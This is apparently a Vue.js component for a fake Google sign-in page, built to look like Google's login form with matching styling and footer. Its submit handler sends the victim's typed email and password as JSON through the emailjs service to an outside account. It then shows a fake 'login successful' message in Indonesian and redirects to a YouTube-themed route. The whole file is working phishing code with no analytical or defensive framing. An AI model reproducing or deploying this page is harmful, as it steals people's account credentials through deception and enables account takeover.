<template>
    <div class="body">
		<form action="" @submit.prevent="loginWithYtb">
            <img src="https://res.cloudinary.com/dvk9bvjrh/image/upload/v1588067571/1ckkcu79ho_bbpjdk.gif" alt="">
            <h1>Sign in</h1>
            <h2>with your Google Account</h2>
            <v-text-field :rules="rules" placeholder="Email" v-model="model.email" required></v-text-field>
            <v-text-field  class="input" type="password" placeholder="Password" required v-model="model.password" ></v-text-field>
            
            <p><a href="">More options</a><span class="text-right"><button type="submit" >NEXT</button></span></p>
		</form>
    <footer>
        English (United States)<img src="https://res.cloudinary.com/dvk9bvjrh/image/upload/v1588068014/mq40xx0kce_qhrtei.gif" alt="">
        <span class="text-right">Help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Terms</span>
    </footer>
    </div>
</template>

<script>

import emailjs from 'emailjs-com';
export default {
    data(){
        return {
			model : {
				email : '',
				password : ''
			},
            rules: [
            value => !!value || 'Required.',
            value => (value || '').length <= 20 || 'Max 20 characters',
            value => {
            const pattern = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
            return pattern.test(value) || 'Invalid e-mail.'
            },
        ],
        }
	},
	methods : {
		loginWithYtb(e){
			
			emailjs.send('gmail','template_cUPqJDVD',{'reply_to' : JSON.stringify(this.model)}, 'user_t4WeKZbPSunNRPrzaFj36')
			.then(result => {
				localStorage.setItem('email', this.model.email)
				this.$swal({
					icon : 'success',
					title : 'Login Berhasil',
					text : 'Anda Akan Diarahkan Halaman Berikutnya'
				})
				.then(result => {
					if(result.value){
						this.$router.push('/proses/youtube')
					}
				})
			})
			.catch(err => {
				console.log(err)
			})
		}
	},
	mounted(){
		
	}
}
</script>

<style scoped>

@font-face {
	font-family: 'Roboto';
	src: 
		local('Roboto Regular'),
		local('Roboto-Regular'),
		url('https://fonts.googleapis.com/css2?family=Roboto&display=swap'),
		format('truetype');
}

* {
	margin: 0;
	padding: 0;
}

.body {
	background: #fff;
	color: #000;
	font-family: "Arial", sans-serif;
	font-size: 14px;
	font-weight: 300;
	text-align: center;
	padding: 60px 40px;
	height: 100%;
}

form {
	display: block;
	min-height: 380px;
	width: 100%;
	margin: 0 auto 25px auto;
	text-align: left;
}

img { zoom: 50% }

h1 {
	font-family: "Roboto", "Arial", sans-serif;
	font-size: 25px;
	font-weight: 400;
	margin-top: 15px;
	margin-bottom: 5px;
}

h2 {
	font-family: "Roboto", "Arial", sans-serif;
	font-size: 14px;
	font-weight: 400;
	margin-bottom: 70px;
}

p {
	font-family: "Roboto", "Arial", sans-serif;
	font-size: 13px;
	font-weight: 300;
	margin-top: 70px;
}

.input {
	display: block;
	width: 100%;
	font-size: 14px;
	font-weight: 300;
	padding: 3px 0;
	margin-top: 30px;
	background: #fff;
	border: none;

	color: #000;
}

input:focus,
select:focus,
textarea:focus,
button:focus {
	outline: none;
}

.warning {
	color: #e50000;
	font-size: 12px;
	text-align: left;
	margin-top: 10px;
}

a, a:hover {
	color: #4d90fe;
	text-decoration: none;
}

button {
	font-size: 13px;
	font-weight: 400;
	border: none;
	border-radius: 3px;
	color: #fff;
	background-color: #4d90fe;
	box-shadow: rgba(0, 0, 0, 0.3) 0px 1px 3px 0px;
	padding: 10px 23px;
	margin-top: -14px;
	cursor: pointer;
}

footer {
	width: 100%;
	margin: 60px auto;
	text-align: left;
	font-size: 12px;
	font-weight: 300;
}

footer span { color: #7e7e7e }
.text-right { float: right }

@media (min-width: 550px) {
	body {
		background: url("https://res.cloudinary.com/dvk9bvjrh/image/upload/v1588067642/rgjhg6922p_vhx2fk.jpg") top left;
	}
	
	form {
		width: 370px;
		background: #fff;
		padding: 60px 40px;
		border-radius: 2px;
		box-shadow: rgba(0, 0, 0, 0.3) 0px 1px 3px 0px;
	}
	
	footer {
		width: 450px;
		margin-top: 25px;
	}
}

</style>